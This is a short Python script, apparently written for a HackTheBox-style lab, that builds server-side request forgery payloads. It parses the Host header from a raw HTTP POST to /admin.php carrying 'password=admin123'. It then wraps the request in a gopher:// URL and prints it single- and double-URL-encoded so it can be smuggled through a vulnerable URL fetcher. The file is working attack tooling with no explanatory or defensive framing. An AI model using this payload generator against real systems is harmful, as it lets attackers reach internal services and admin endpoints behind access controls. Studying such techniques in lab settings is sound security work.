#!/usr/bin/env python3
import re
from urllib.parse import quote

def extract_host_port(payload: str) -> tuple[str, int]:
    """
    Parse the Host header from a raw HTTP request.
    Accepts: example.com, example.com:8080, [2001:db8::1], [2001:db8::1]:8080
    Default port = 80 if not specified.
    """
    m = re.search(r"(?mi)^\s*Host:\s*([^\r\n]+)", payload)
    if not m:
        raise ValueError("No Host header found in payload")
    hostval = m.group(1).strip()

    # Default port
    port = 80

    # IPv6 in brackets?
    if hostval.startswith('['):
        end = hostval.find(']')
        if end != -1:
            host = hostval[1:end]
            rest = hostval[end+1:].strip()
            if rest.startswith(':'):
                p = rest[1:]
                if p.isdigit():
                    port = int(p)
            return host, port

    # Host[:port]
    if ':' in hostval:
        h, p = hostval.rsplit(':', 1)
        if p.isdigit():
            return h, int(p)
    return hostval, port


payload = (
    "POST /admin.php HTTP/1.1\r\n"
    "Host: someserver.htb\r\n"
    "Content-Length: 17\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "\r\n"
    "password=admin123"
)

# 1) First pass: keep / and : so /admin.php and header colons stay readable
enc1 = quote(payload, safe="/-._:")

# 2) But force ONLY the HTTP version slash to be encoded
enc1 = enc1.replace("HTTP/1.1", "HTTP%2F1.1", 1)

# >>> Use Host header for gopher URL
host, port = extract_host_port(payload)
u1 = f"gopher://{host}:{port}/_{enc1}"   # single-encoded
u2 = quote(u1, safe="/")                  # double-encoded (slashes preserved)

print(u1)
print(u2)
